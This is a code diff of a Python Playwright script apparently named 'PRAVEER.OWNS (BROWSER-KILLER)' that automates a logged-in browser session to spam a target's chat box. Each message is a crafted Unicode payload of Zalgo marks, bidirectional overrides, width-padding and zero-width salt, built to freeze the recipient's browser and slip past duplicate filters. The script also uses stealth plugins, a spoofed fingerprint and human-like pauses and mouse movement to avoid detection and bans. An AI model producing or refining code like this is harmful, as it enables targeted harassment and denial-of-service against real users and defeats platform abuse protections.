@@ -1,26 +1,24 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (BROWSER-KILLER)
-# 📅 STATUS: 1-ID-ULTRA-SAFE | DESKTOP-LAG | PLAYWRIGHT
+# 🚀 PROJECT: PRAVEER.OWNS (LONE-WOLF FINAL)
+# 📅 STATUS: 1-ID-STABILITY | DESKTOP-FREEZE | FIXED-IMPORT
 
 import os, asyncio, random, sys
 from playwright.async_api import async_playwright
-from playwright_stealth import stealth as stealth_func
+# --- THE ABSOLUTE IMPORT FIX ---
+import playwright_stealth
 
 def get_kernel_stop_payload(target_name):
     """Targets Desktop Browser Layout Engines."""
     u_id = random.randint(10000, 99999)
-    # Salted invisible markers to bypass duplicate filters
     salt = "".join(random.choices(["\u200b", "\u200c", "\u200d", "\u200e"], k=15))
     header = f"⚡ 【﻿ＰＲＡＶＥＥＲ　ＰＡＰＡ　ＯＮ　ＴＯＰ】 ⚡\n🆔 {u_id}{salt}\n"
     
     # 🏗️ EXTREME DENSITY (120 Zalgo marks per line)
-    # This creates a 'Vertical Pillar' that overlaps 10+ lines of text
     z_tower = "̸" * 120 
     width_bomb = "\u2800\u00A0" * 45
     lines = [header]
     
-    for i in range(85): # 85 lines keeps us safely under 10k chars with high density
-        # BIDI Overrides: Forces the browser to re-calculate text direction constantly
+    for i in range(85): 
         prefix = "\u202E" if i % 2 == 0 else "\u202D"
         noise = "".join(random.choices("0123456789", k=2))
         lines.append(f"{width_bomb}{prefix}𝕻𝕬𝕻𝕬_{noise}{z_tower}")
@@ -32,13 +30,14 @@ async def agent_blitz(machine_id, cookie_list, target_id, target_name):
 
     async with async_playwright() as p:
         browser = await p.chromium.launch(headless=True)
-        # 🎭 Desktop Fingerprint (Wide Viewport)
         context = await browser.new_context(
             user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
             viewport={'width': 1920, 'height': 1080}
         )
         page = await context.new_page()
-        await stealth_func(page)
+        
+        # ✅ THE CALL: Accessing the function directly from the module
+        await playwright_stealth.stealth(page)
         
         try:
             print(f"📡 [M{machine_id}] Establishing Stealth Connection...")
@@ -59,20 +58,16 @@ async def agent_blitz(machine_id, cookie_list, target_id, target_name):
                 payload = get_kernel_stop_payload(target_name)
                 
                 await page.click(box_selector)
-                # 'Fill' is better for large payloads in Playwright
                 await page.fill(box_selector, payload)
-                await asyncio.sleep(random.uniform(3, 5)) # Human-like pause
+                await asyncio.sleep(random.uniform(3, 5)) 
                 await page.keyboard.press("Enter")
                 
-                print(f"💀 [M{machine_id}] Browser-Killer Delivered. Target UI Locked.")
+                print(f"💀 [M{machine_id}] Browser-Killer Delivered.")
 
                 # ⏳ THE 'SAFETY GAP' (120-150 seconds)
-                # With 1 ID, you MUST wait 2+ mins. 
-                # The browser will stay frozen the entire time because of the Zalgo weight.
                 sleep_time = random.uniform(120, 150)
-                print(f"⏳ Cooling down for {int(sleep_time)}s to keep ID safe...")
+                print(f"⏳ Cooling down for {int(sleep_time)}s...")
                 
-                # Mimic active tab behavior during sleep
                 for _ in range(4):
                     await asyncio.sleep(sleep_time / 4)
                     await page.mouse.move(random.randint(0, 500), random.randint(0, 500))
